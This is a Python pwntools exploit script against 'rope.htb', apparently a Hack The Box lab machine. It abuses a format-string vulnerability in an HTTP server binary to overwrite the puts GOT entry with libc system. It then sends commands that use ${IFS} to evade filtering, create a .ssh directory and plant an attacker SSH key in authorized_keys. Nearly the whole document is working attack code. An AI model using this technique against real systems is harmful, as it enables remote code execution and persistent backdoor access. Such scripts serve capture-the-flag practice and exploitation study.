from pwn import *
import urllib

# Author: Humayun Ali Khan
# Credit: TheEyeOfCyber 

context.arch = 'i386'
context.log_level = 'debug'

HOST = "rope.htb"
PORT = 9999

binary= ELF('httpserver')
libc = ELF('libc-2.27.so')

#autofmt = FmtStr(trigger)
#print(f"Offset: {autofmt.offset}")
offset = 53

bin_base = 0x565ef000
libc_base = 0xf7d0d000


writes = {(bin_base + binary.got['puts']): (libc_base + libc.symbols['system'])}
payload = fmtstr_payload(offset, writes)

cmd = "mkdir${IFS}/home/john/.ssh"
io = remote(HOST, PORT, level='debug')    
io.send(f"{cmd} /{urllib.parse.quote(payload)}\n\n")   
io.close()


cmd = "/bin/echo${IFS}ssh-rsa${IFS}AAAAB3NzaC1yc2EAAAADAQABAAABgQDFKHiXRXt0I031CPGRaSaYvtlcDjbaWvV5CInEWiwV0k+U218iPr+1EuV6VqcdEVDsxGvEiv/2eTVoIuOWHV+YWjyoUsTlR1JFX26VhO3SAXTfr2liIyi0JWkCzygO5sucXzS/0PcfOioPOBEzPOF7BksDHV+h17JhfxSB4Mqfd9gR0az7OzHSaKClXFw/DwohWSv9u/Bbf3tMy8JSyYj2kc2relWAZSNjYhXlm8ebYqChidfjCiKgp2clcpFHliWxk0FqMn/CEyLcpyIhByHRZX5gK1pOit0CfteXRmlCS0sS3gRsBfKkKtLjn9aqzCHNNCy28Auq7wZEIYwZrZc+ze8nd693dBrRwoNXglBWtW8Y7ATG6rcUQfoFJrSG6LfXqsSmogomynNk57LHvbAOTi86GmNqy0+JjXAw/z9mNSw70SFJIIij5ua71Ekvw7SHZwFGFX9Gfkb3pOuVHFPmlFlZN4TLUe1JehGpyOhZk8Hya4MpemZjzUDEV1P4a+0=>/home/john/.ssh/authorized_keys"
io = remote(HOST, PORT, level='debug')    
io.send(f"{cmd} /{urllib.parse.quote(payload)}\n\n")   
io.close()
